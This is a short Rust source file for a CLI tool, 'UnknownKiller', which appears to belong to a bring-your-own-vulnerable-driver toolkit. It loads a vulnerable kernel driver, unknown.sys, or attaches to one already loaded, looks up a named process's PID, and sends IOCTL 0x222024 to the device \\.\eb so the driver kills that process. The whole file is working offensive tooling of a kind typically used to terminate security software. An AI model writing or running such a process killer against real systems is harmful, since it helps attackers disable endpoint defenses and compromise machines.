use byovd_lib::{get_pid_by_name, send_ioctl, DriverConfig, Result};
use clap::Parser;

// ============================================================================
// Driver Configuration - unknown.sys (origin TBD)
// Device path and IOCTL taken from the public C PoC reference.
// ============================================================================

struct UnknownDriver;

impl DriverConfig for UnknownDriver {
    fn driver_name(&self) -> &str {
        "unknown"
    }

    fn driver_file(&self) -> &str {
        "unknown.sys"
    }

    fn device_path(&self) -> &str {
        "\\\\.\\eb"
    }

    fn ioctl_code(&self) -> u32 {
        0x222024
    }

    fn build_ioctl_input(&self, pid: u32, _process_name: &str) -> Vec<u8> {
        pid.to_ne_bytes().to_vec()
    }
}

// ============================================================================
// CLI
// ============================================================================

#[derive(Parser)]
#[command(name = "UnknownKiller", version, author = "BlackSnufkin")]
#[command(about = "BYOVD process killer using unknown.sys")]
struct Cli {
    /// Target process name (e.g., notepad.exe)
    #[arg(short = 'n', long = "name", required = true)]
    process_name: String,

    /// Attach to an already-loaded driver -- skip service install/start/stop
    /// and just open the device + send the IOCTL.
    #[arg(short = 'a', long = "attach")]
    attach: bool,
}

// ============================================================================
// Main
// ============================================================================

fn main() -> Result<()> {
    let cli = Cli::parse();
    let driver = UnknownDriver;

    if cli.attach {
        println!("[*] Attach mode: assuming driver is already loaded");
        let pid = get_pid_by_name(&cli.process_name)
            .ok_or_else(|| format!("Process '{}' not found", cli.process_name))?;
        println!("[*] Target {} -> PID {}", cli.process_name, pid);
        send_ioctl(&driver, pid, &cli.process_name)?;
        println!("[+] IOCTL dispatched");
        Ok(())
    } else {
        byovd_lib::run(&driver, &cli.process_name, None)
    }
}
